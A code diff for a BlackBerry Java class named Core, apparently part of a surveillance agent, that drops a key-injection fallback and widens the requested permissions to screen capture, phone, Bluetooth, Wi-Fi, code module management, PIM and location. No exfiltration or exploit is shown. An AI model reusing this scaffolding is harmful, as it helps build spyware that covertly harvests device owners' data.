@@ -61,7 +61,7 @@ public final class Core implements Runnable {
      * Instantiates a new core.
      */
     private Core() {
-
+               
         task = Task.getInstance();
         Utils.sleep(1000);
         // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
@@ -79,11 +79,7 @@ public final class Core implements Runnable {
         // #debug debug
         debug.trace("Antenna: " + antennaInstalled);
 
-        if (!Keys.hasBeenBinaryPatched()) {
-            // #debug
-            debug.warn("Not binary patched, injecting 323");
-            InstanceKeys323.injectKeys323();
-        }
+       
 
         Encryption.init();
 
@@ -131,14 +127,29 @@ public final class Core implements Runnable {
         apm.addReasonProvider(ApplicationDescriptor.currentApplicationDescriptor(), drp);
         //#endif
 
-        if (original
-                .getPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE) == ApplicationPermissions.VALUE_ALLOW
-                && original
-                        .getPermission(ApplicationPermissions.PERMISSION_PHONE) == ApplicationPermissions.VALUE_ALLOW
-                && original
-                        .getPermission(ApplicationPermissions.PERMISSION_BLUETOOTH) == ApplicationPermissions.VALUE_ALLOW
-                && original
-                        .getPermission(ApplicationPermissions.PERMISSION_EMAIL) == ApplicationPermissions.VALUE_ALLOW) {
+        int[] wantedPermissions = new int[] {
+                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
+                ApplicationPermissions.PERMISSION_PHONE,
+                ApplicationPermissions.PERMISSION_BLUETOOTH,
+                ApplicationPermissions.PERMISSION_WIFI,
+                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
+                ApplicationPermissions.PERMISSION_PIM,
+                ApplicationPermissions.PERMISSION_PHONE,
+                ApplicationPermissions.PERMISSION_LOCATION_API
+        };
+        
+        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
+        
+        boolean allPermitted = true;
+        for(int i = 0; i< wantedPermissions.length; i++){
+            int perm = wantedPermissions[i];
+            
+            if(original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW){
+                allPermitted = false;
+            }
+        }
+                       
+        if (allPermitted) {
             // All of the necessary permissions are currently available
             // #debug info
             debug
@@ -154,12 +165,11 @@ public final class Core implements Runnable {
         // user.
         // Please only request the permissions needed for your application.
         final ApplicationPermissions permRequest = new ApplicationPermissions();
-        permRequest
-                .addPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE);
-        permRequest.addPermission(ApplicationPermissions.PERMISSION_PHONE);
-        permRequest.addPermission(ApplicationPermissions.PERMISSION_BLUETOOTH);
-        permRequest.addPermission(ApplicationPermissions.PERMISSION_EMAIL);
-
+        for(int i = 0; i< wantedPermissions.length; i++){
+            int perm = wantedPermissions[i];
+            permRequest.addPermission(perm);
+        }
+       
         final boolean acceptance = ApplicationPermissionsManager.getInstance()
                 .invokePermissionsRequest(permRequest);
 
@@ -169,13 +179,6 @@ public final class Core implements Runnable {
             debug.info("User has accepted all of the permissions");
             return;
         } else {
-            // The user has only accepted some or none of the permissions
-            // requested. In this sample, we will not perform any additional
-            // actions based on this information. However, there are several
-            // scenarios where this information could be used. For example,
-            // if the user denied networking capabilities then the application
-            // could disable that functionality if it was not core to the
-            // operation of the application.
             // #debug
             debug.warn("User has accepted some or none of the permissions");
         }
